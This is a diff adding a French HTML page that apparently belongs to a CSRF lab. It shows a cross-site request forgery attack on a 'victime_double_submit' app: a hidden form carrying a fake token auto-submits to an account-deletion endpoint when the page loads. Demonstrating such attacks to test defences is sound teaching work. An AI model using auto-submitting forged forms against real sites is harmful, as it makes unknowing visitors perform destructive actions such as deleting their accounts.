@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head><title>Attaque Double Submit</title></head>
+<body>
+<h2>Attaque contre victime_double_submit</h2>
+<form method="POST" action="../victime_double_submit/supprcmpt.php" id="attackForm">
+    <input type="hidden" name="csrf_token" value="FAUXTOKEN123456">
+</form>
+<script>
+    document.getElementById("attackForm").submit();
+</script>
+</body>
+</html>
